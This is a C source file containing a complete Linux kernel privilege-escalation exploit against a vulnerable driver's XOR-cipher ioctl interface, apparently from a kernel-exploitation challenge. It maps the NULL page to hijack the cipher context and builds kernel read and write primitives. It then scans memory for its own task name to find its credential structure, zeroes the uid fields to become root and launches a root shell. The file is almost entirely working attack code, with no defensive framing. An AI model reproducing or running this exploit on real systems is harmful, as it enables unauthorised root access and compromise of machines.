#define _GNU_SOURCE 
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include "exp.h"

int fd;
XorCipher *ctx = NULL;
int read_primitive(char *dst/*user*/, char *src/*kernel*/, uint64_t len){ // read value from the kernel
    /* now we can control ctx */
    ctx->data    = src;
    ctx->datalen = len;
    if(ioctl_getdata(fd, dst, len) < 0){return -1;}
    return 0;
}

int write_primitive(char *dst/*kernel*/, char *src/*user*/, uint64_t len){ // write value to the kernel
    char *key; 
    if((key = (char *)malloc(len)) < 0){ERROR("failed to allocate key")}
    read_primitive(key, dst, len); // set key to dest
    for(int i = 0; i < len; i++){key[i] ^= src[i];} // we xor it src so next when we'll xor it with dst will get the value of src
    /* now we can control ctx */
    ctx->data    = dst;
    ctx->datalen = len;
    ctx->key     = key;
    ctx->keylen  = len;
    if(ioctl_encrypt(fd) < 0){return -1;}
	free(key);
    return 0;
}

int main(int argc, char **argv){
    
    if((fd=open(DEVICE_PATH, O_RDWR)) < 0){ERROR("failed to open the vulnerable device..")} 
    if(mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE | MAP_POPULATE, -1, 0) != NULL){ERROR("failed to map NULL page")}
    if(prctl(PR_SET_NAME, "UnknownD")){ERROR("Failed to set thread's name with prctl..")} // there is a string (char comm[ TASK_COMM_LEN]) that contains the thread's name, we can utilize it to find the task_struct
    uint64_t addr, stride = 0x1000000;
    char *haystack = (char*)malloc(stride);
    for(addr = 0xffff888000000000; addr < 0xffffc88000000000; addr += stride){
      if(!(read_primitive(haystack, (char *)addr, stride))){
        char *needle;
        if((needle = memmem(haystack, stride,"UnknownD", 8))){
            addr += (needle - haystack); // add the offset
			printf("[+] Found the needle (comm) at address:           %p\n", addr);
			
			break;		
		}
      }
    }
	if(addr == 0xffffc88000000000){ERROR("couldn't find the comm string..")}
	uint64_t current_cred = 0;
	char zero[0x20] = {0};
	/* get the address of the current cred structure */
	if(read_primitive((char *)&current_cred, (char *)addr-8, 8)){ERROR("read primitive failed")}
	printf("[+] Found the current cred struct is at address: %p\n",current_cred);
	/* zero the id's (starting from kuid_t uid) */
	if(write_primitive((char *)(current_cred+4), (char*)zero, sizeof(zero))){ERROR("write primitive failed")}  
    puts("[+] You Won!");
	system("/bin/sh");
	return 0;
}


